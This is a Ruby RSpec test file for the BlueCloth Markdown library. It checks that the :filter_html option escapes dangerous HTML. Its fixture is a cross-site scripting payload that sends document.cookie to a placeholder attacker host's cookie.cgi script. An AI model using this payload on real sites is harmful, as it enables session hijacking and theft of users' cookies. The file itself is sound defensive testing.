# Unit test for contributed features 
require 'spec_helper'

describe "contrib test case" do

	DangerousHtml =
		"<script>document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie</script>"
	DangerousHtmlOutput =
		"<p>&lt;script&gt;document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie&lt;/script&gt;</p>"
	DangerousStylesOutput =
		"<script>document.location='http://www.hacktehplanet.com" +
		"/cgi-bin/cookie.cgi?' + document.cookie</script>"
	NoLessThanHtml = "Foo is definitely > than bar"
	NoLessThanOutput = "<p>Foo is definitely &gt; than bar</p>"


	### HTML filter options contributed by Florian Gross.

	# Test the :filter_html restriction
  it "should filter HTML" do
    bc = bluecloth DangerousHtml, :filter_html

		# Accessors
		bc.filter_html.should == true
		bc.filter_styles.should be_nil

		# Test rendering with filters on
		bc.to_html.should == DangerousHtmlOutput

		# Test setting it in a sub-array
    bc = bluecloth DangerousHtml, [:filter_html]
		
		# Accessors
		bc.filter_html.should == true
		bc.filter_styles.should be_nil

		# Test rendering with filters on
		bc.to_html.should == DangerousHtmlOutput
	end


	# Test the :filter_styles restriction
  it "should filter styles" do
    pending
		rval = bc = nil

		# Test as a 1st-level param
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, :filter_styles )
		}
		assert_instance_of BlueCloth, bc
		
		# Accessors
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousStylesOutput, rval

		# Test setting it in a subarray
		assert_nothing_raised {
			bc = BlueCloth::new( DangerousHtml, [:filter_styles] )
		}
		assert_instance_of BlueCloth, bc

		# Accessors
		assert_nothing_raised { rval = bc.filter_styles }
		assert_equal true, rval
		assert_nothing_raised { rval = bc.filter_html }
		assert_equal nil, rval

		# Test rendering with filters on
		assert_nothing_raised { rval = bc.to_html }
		assert_equal DangerousStylesOutput, rval

	end


	# Test to be sure filtering when there's no opening angle brackets doesn't
	# die.
  it "should filter 'no less than'" do
    pending
		rval = bc = nil

		# Test as a 1st-level param
		assert_nothing_raised {
			bc = BlueCloth::new( NoLessThanHtml, :filter_html )
		}
		assert_instance_of BlueCloth, bc

		assert_nothing_raised { rval = bc.to_html }
		assert_equal NoLessThanOutput, rval
	end

end

